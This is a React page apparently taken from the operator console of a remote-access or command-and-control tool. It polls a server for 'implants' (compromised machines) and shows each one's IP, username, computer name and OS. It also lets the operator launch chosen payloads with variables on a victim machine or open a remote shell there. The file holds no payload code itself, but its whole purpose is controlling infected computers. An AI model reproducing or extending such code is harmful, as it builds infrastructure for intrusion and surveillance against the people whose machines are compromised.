import { useEffect, useState } from "react";
import { Button, ButtonGroup, Container, Form, InputGroup, Modal, Spinner, Table, Toast } from "react-bootstrap";
import {useNavigate} from "react-router-dom"
import UserService from "../services/UserService";

const SlavesPage = () => {

    const userService = new UserService();
    const navigate = useNavigate();
    const [slaves, setSlaves] = useState([]);
    const [loading, setLoading] = useState(true);
    const [modalShow, setModalShow] = useState(false);

    const [infoSlave, setInfoSlave] = useState({});

    // Launching a payload.
    const [payloads, setPayloads] = useState([]);
    const [selectedPayload, setSelectedPayload] = useState({});
    const [payloadErrorText, setPayloadErrorText] = useState("");
    const [payloadVars, setPayloadVars] = useState({});
    const [selectedSlave, setSelectedSlave] = useState("");
    const [compileError, setCompileError] = useState("");
    const pickPayload = (e) => {
        setSelectedPayload(payloads[e.target.value]);

        // If selected payload has variables.
        if (payloads[e.target.value].variables) {

            let payVars = [];
            payloads[e.target.value].variables.forEach((v) => {
                payVars.push({"name": v.varname, "value": null});
            });
            
            setPayloadVars(payVars);
        }
    }
    const varChange = (e) => {
        const {name, value} = e.target;

        let newPayloadVars = payloadVars.map((v) => {
            if (v.name == name) {
                v.value = value;
            }

            return v;
        })

        setPayloadVars(newPayloadVars);
    }
    const launchPayload = () => {

        setCompileError("");
        setPayloadErrorText("");
        if (selectedPayload.variables && payloadVars) {

            // Check if payloadvars are set.
            if (payloadVars.filter((v => v.value != null)).length != 
                selectedPayload.variables.length) {
                setPayloadErrorText("No variables set correctly!");
                return;
            }
        }

        const payload = {
            payloadId: selectedPayload.id,
            variables: payloadVars,
            slaveId: selectedSlave
        }
        userService.launchPayload(payload).then((res) => {

            setModalShow(false);
            window.location.reload()

        }).catch((err) => {

            if (err.code == "ERR_NETWORK") {
                localStorage.clear();
                window.location.replace("/?error=reset");
                return;
            }

            if (err.response.data.compileError) {
                setCompileError(err.response.data.compileError);
            }

            console.error("Failed to launch implant!");
            setPayloadErrorText("Failed to launch payload! Message: " + err.response.data.message);
        })
        
    }

    const launchShell = () => {
        window.location.replace("/shell/" + selectedSlave)
    }
    

    useEffect(() => {
        setInterval(() => {
            userService.getSlaves().then((res) => {
    
                setSlaves(res.data);
                setLoading(false);
    
            }).catch((err) => {

                if (err.code == "ERR_NETWORK") {
                    localStorage.clear();
                    window.location.replace("/?error=reset");
                    return;
                }

                console.error(err);
                console.error("Failed to retrieve implants!");
            })

            userService.getPayloads().then((res) => {
                setPayloads(res.data);
            }).catch((err) => {

                if (err.code == "ERR_NETWORK") {
                    localStorage.clear();
                    window.location.replace("/?error=reset");
                    return;
                }

                console.error(err);
                console.error("Failed to retrieve implants!");
            })

        }, 1000);
    }, [])

    const showModal = (index) => {

        const slave = slaves[index];
        setInfoSlave({
            index: index,
            id: slave.id,
            computername: slave.computername,
            os: slave.os,
            nickname: slave.nickname,
            username: slave.username,
            ip: slave.ip,
            info: slave.info
        })
        setNickName("");
        setModalShow(true);
    }

    const [nickname, setNickName] = useState("");
    const changeNickname = (index) => {
        userService.setNickName(slaves[index].id, nickname).catch((err) => {
            alert("Failed to set nickname! HTTP code: " + err.response.status);
        })
    }

    return (
        <>
        <Modal show={modalShow} onHide={() => setModalShow(false)} size="lg">
            <Modal.Header closeButton>
                <Modal.Title>Implant details</Modal.Title>
            </Modal.Header>
            <Modal.Body>
                <h4>Implant:</h4>
                <Table size="sm">
                <tbody>
                    <tr>
                        <th>ID</th>
                        <td>{infoSlave.id}</td>
                    </tr>
                    <tr>
                        <th>Computername</th>
                        <td>{infoSlave.computername}</td>
                    </tr>
                    <tr>
                        <th>Operating system</th>
                        <td>{infoSlave.os}</td>
                    </tr>
                    <tr>
                        <th>Nickname</th>
                        <td>
                            <ButtonGroup>
                                <Form.Control placeholder="Putin's computer" onChange={(e) => setNickName(e.target.value)} value={nickname}></Form.Control>
                                <Button onClick={() => changeNickname(infoSlave.index)} variant="success">Update</Button>
                            </ButtonGroup>
                        </td>
                    </tr>
                    <tr>
                        <th>Username</th>
                        <td>{infoSlave.username}</td>
                    </tr>
                    <tr>
                        <th>IP address</th>
                        <td>{infoSlave.ip}</td>
                    </tr>
                    <tr>
                        <th>Info computer</th>
                        <td>{infoSlave.info}</td>
                    </tr>
                </tbody>
                </Table>

                <h4>Execute payload</h4>
                <InputGroup>
                    <InputGroup.Text>Payload</InputGroup.Text>
                    <Form.Select onChange={pickPayload}>
                        <option>Select a payload</option>
                        {
                            payloads ? payloads.map((payload, index) => (
                                <option value={index}>{payload.name}</option>
                            )) : <></>
                        }
                    </Form.Select>
                </InputGroup>
                {
                    selectedPayload ? <p>{selectedPayload.description}</p> : <></>
                }
                    {
                        selectedPayload && selectedPayload.variables ?
                            selectedPayload.variables.map((v) => (
                                <>
                                <InputGroup>
                                    <InputGroup.Text>{v.varname} ({v.vartype})</InputGroup.Text>
                                    <Form.Control placeholder={v.description} onChange={varChange} name={v.varname}/>
                                </InputGroup>
                                </>
                            )) : <></>
                    }
                <br/>
                {payloadErrorText ? <p style={{color: "red"}}>{payloadErrorText}</p> : <></>}
                <br/>
                { compileError.length > 0 ? <pre>{compileError}</pre> : <></>}
                <Button variant="outline-danger" onClick={() => launchPayload()}>Launch</Button>  
                <Button variant="outline-dark" style={{marginLeft: "10px"}} onClick={() => launchShell()}>Shell</Button>
            </Modal.Body>
        </Modal>

        <h1>All implants</h1>
        <Table striped bordered hover>
            <thead>
                <th>Nickname</th>
                <th>IP address</th>
                <th>Username</th>
                <th>Computername</th>
                <th>OS</th>
            </thead>
            <tbody style={{cursor: "pointer"}}>
                {
                    slaves && slaves.length > 0 ? slaves.map((slave, index) => (
                        <tr onClick={() => {showModal(index);setSelectedSlave(slave.id)}}>
                            <td>{slave.nickname}</td>
                            <td>{slave.ip}</td>
                            <td>{slave.username}</td>
                            <td>{slave.computername}</td>
                            <td>{slave.info}</td>
                        </tr>
                    )) : <></>
                }
            </tbody>
        </Table>
        {
            loading ? <p>Loading... <Spinner/></p> : <></>
        }
        </>
    )
}

export default SlavesPage;